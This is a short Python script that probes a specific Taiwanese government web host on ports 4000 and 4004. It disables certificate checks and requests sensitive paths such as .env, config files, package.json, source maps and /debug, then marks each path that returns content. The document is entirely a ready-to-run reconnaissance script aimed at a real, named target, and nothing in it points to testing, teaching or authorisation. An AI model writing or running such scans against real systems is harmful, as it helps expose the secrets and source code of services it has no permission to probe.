import requests,urllib3
urllib3.disable_warnings()
s=requests.Session(); s.verify=False
paths=["/package.json","/config.js","/config.json","/server.js","/app.js","/.env","/env.js",
"/src/config.js","/config","/api/config","/version","/app.js.map","/index.js.map",
"/stylesheets/style.css.map","/source/app.js","/debug","/config/server.json","/api/version"]
for h in ["4000","4004"]:
    for p in paths:
        try:
            r=s.get("https://epcr.tpf.gov.tw:%s%s"%(h,p),timeout=12)
            flag="***" if (200<=r.status_code<300 and r.status_code!=204 and len(r.content)>0) else ""
            print("[s%s] %-28s %s %6dB %s"%(h,p,r.status_code,len(r.content),flag))
        except Exception as e:
            print("[s%s] %-28s ERR %s"%(h,p,str(e)[:40]))
